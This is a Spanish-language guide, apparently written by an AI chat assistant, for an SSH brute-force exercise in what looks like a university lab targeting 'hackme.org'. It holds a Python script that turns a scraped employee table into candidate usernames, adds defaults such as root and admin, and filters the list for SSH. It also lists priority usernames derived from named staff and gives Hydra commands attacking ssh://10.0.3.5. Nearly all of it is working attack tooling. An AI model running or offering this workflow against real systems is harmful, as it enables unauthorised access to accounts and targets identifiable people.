```markdown
# Generación y Filtrado de Usuarios para Ataque SSH

## Objetivo
Generar una lista de posibles nombres de usuario a partir de un archivo `empleados.html` y filtrarla para que sea compatible con SSH (caracteres permitidos en Linux).

## 1. Script de extracción de usuarios (`usuarios.py`)

El script parsea el HTML, extrae nombres, apellidos y emails, y genera múltiples variaciones de usernames.

```python
#!/usr/bin/env python3
import re
import html
from unicodedata import normalize

def limpiar(texto):
    """Limpia texto: quita HTML, normaliza, convierte a ASCII"""
    if not texto:
        return ""
    texto = html.unescape(texto)
    texto = re.sub(r'<[^>]+>', '', texto)
    texto = normalize('NFKD', texto).encode('ASCII', 'ignore').decode('ASCII')
    texto = re.sub(r'[^a-zA-Z\s\.\,\-]', '', texto)
    return texto.strip()

def main():
    with open('empleados.html', 'r', encoding='utf-8') as f:
        content = f.read()
    
    tbody_match = re.search(r'<TBODY>(.*?)</TBODY>', content, re.DOTALL | re.IGNORECASE)
    if not tbody_match:
        print("[!] No se encontró TBODY")
        return
    
    tbody = tbody_match.group(1)
    rows = re.findall(r'<TR>(.*?)</TR>', tbody, re.DOTALL | re.IGNORECASE)
    
    empleados = []
    
    for row in rows:
        celdas = re.findall(r'<TD[^>]*>(.*?)</TD>', row, re.DOTALL | re.IGNORECASE)
        if len(celdas) < 3:
            continue
        
        nombre_celda = celdas[0]
        email_celda = celdas[2]
        
        nombre_limpio = limpiar(nombre_celda)
        if not nombre_limpio:
            continue
        
        email_match = re.search(r'([a-z]+@hackme\.org)', email_celda, re.IGNORECASE)
        email = email_match.group(1).replace('@hackme.org', '') if email_match else ""
        
        if ',' in nombre_limpio:
            apellido, nombre = nombre_limpio.split(',', 1)
            apellido = apellido.strip().lower()
            nombre = nombre.strip().lower()
        else:
            apellido = nombre_limpio.lower()
            nombre = ""
        
        primer_nombre = nombre.split()[0] if nombre else ""
        
        empleados.append({
            'nombre': primer_nombre,
            'apellido': apellido,
            'email': email,
        })
    
    # Generar variaciones
    usuarios = set()
    
    for emp in empleados:
        n = emp['nombre']
        a = emp['apellido']
        e = emp['email']
        
        if not a:
            continue
        
        if n:
            usuarios.add(f"{n}{a}")           # juancruz
            usuarios.add(f"{n}.{a}")          # juan.cruz
            usuarios.add(f"{n}_{a}")          # juan_cruz
            usuarios.add(f"{n}{a[0]}")        # juanc
            usuarios.add(f"{n[0]}{a}")        # jcruz
            usuarios.add(f"{n[0]}.{a}")       # j.cruz
            usuarios.add(f"{n[0]}{a[0]}")     # jc
            usuarios.add(f"{a}{n}")           # cruzjuan
            usuarios.add(f"{a}{n[0]}")        # cruzj
            usuarios.add(f"{a}.{n}")          # cruz.juan
        
        usuarios.add(a)                        # solo apellido
        if n:
            usuarios.add(n)                    # solo nombre
        
        if e:
            usuarios.add(e)
            # Corrección de typos conocidos
            if e == 'eaosta':
                usuarios.add('eacosta')
            if e == 'games':
                usuarios.add('lames')
            if e == 'nandrus':
                usuarios.add('nandruskiewitsch')
    
    # Agregar usuarios sospechosos (trampas típicas de docentes)
    sospechosos = [
        'root', 'admin', 'administrador', 'administrator', 'sysadmin',
        'test', 'testing', 'user', 'default', 'guest', 'backup',
        'hackme', 'empresa', 'hackme2024', 'hackme2025'
    ]
    usuarios.update(sospechosos)
    
    with open('usuarios.txt', 'w') as f:
        for u in sorted(usuarios):
            if u and len(u) >= 2:
                f.write(f"{u}\n")
    
    print(f"[+] Generados {len([u for u in usuarios if u and len(u)>=2])} usuarios")

if __name__ == "__main__":
    main()
```

## 2. Filtrado de usuarios válidos para SSH

Linux/SSH solo permite ciertos caracteres en nombres de usuario:
- Letras minúsculas (a-z)
- Números (0-9)
- Punto (.)
- Guión (-)
- Guión bajo (_)

Longitud típica: entre 2 y 32 caracteres.

### Método 1: Con grep (si no hay conflictos con rg)

```bash
grep -E '^[a-z0-9._-]{2,32}$' usuarios.txt > usuarios_ssh_validos.txt
```

### Método 2: Con Python (más confiable)

```bash
python3 << 'EOF'
import re

with open('usuarios.txt', 'r') as f:
    usuarios = [line.strip() for line in f if line.strip()]

validos = []
for u in usuarios:
    if re.match(r'^[a-z0-9._-]{2,32}$', u):
        validos.append(u)

with open('usuarios_ssh_validos.txt', 'w') as f:
    for u in sorted(validos):
        f.write(f"{u}\n")

print(f"Usuarios válidos para SSH: {len(validos)}")
EOF
```

### Método 3: Si hay error con grep (ripgrep interfiere)

```bash
/bin/grep -E '^[a-z0-9._-]{2,32}$' usuarios.txt > usuarios_ssh_validos.txt
# o
egrep '^[a-z0-9._-]{2,32}$' usuarios.txt > usuarios_ssh_validos.txt
```

## 3. Lista prioritaria (para probar primero)

```bash
cat > usuarios_top.txt << 'EOF'
eacosta
racosta
jadrover
daguirre
gaguirre
halagia
lames
nandrus
aandrada
acosta
adrover
aguirre
alagia
ames
andrada
e.acosta
r.acosta
j.adrover
d.aguirre
g.aguirre
EOF
```

## 4. Resumen de formatos generados

| Formato | Ejemplo | Válido SSH |
|---------|---------|------------|
| nombreapellido | `juancruz` | ✅ |
| nombre.apellido | `juan.cruz` | ✅ |
| nombre_apellido | `juan_cruz` | ✅ |
| nombre-apellido | `juan-cruz` | ✅ |
| inicialapellido | `jcruz` | ✅ |
| inicial.apellido | `j.cruz` | ✅ |
| solo apellido | `cruz` | ✅ |
| solo nombre | `juan` | ✅ |
| email (sin @) | `juancruz` | ✅ |
| email (con @) | `juan@cruz.com` | ❌ |
| con espacios | `juan cruz` | ❌ |

## 5. Archivos generados

- `usuarios.txt` → Lista completa (todos los formatos)
- `usuarios_ssh_validos.txt` → Solo caracteres permitidos en SSH
- `usuarios_top.txt` → Lista prioritaria manual

## 6. Ataque con Hydra

```bash
# Con lista filtrada
hydra -L usuarios_ssh_validos.txt -P dic.txt ssh://10.0.3.5 -t 4 -V -o resultados.txt

# Con lista prioritaria y opciones extras (-e nsr)
hydra -L usuarios_top.txt -P dic.txt ssh://10.0.3.5 -t 4 -V -e nsr -o resultados_top.txt
```

## Nota importante

Los docentes suelen ser "tramposos", por lo que el username puede no coincidir con el email. Casos comunes:
- `eaosta` (typo) → `eacosta` (corregido)
- `games` (Lucas Ames) → `lames` o `lucasames`
- `nandrus` (Nicolás) → `nandruskiewitsch`
- `halagia` (Humberto Alagia, sin email)
```

¿Querés que agregue algo más a la nota?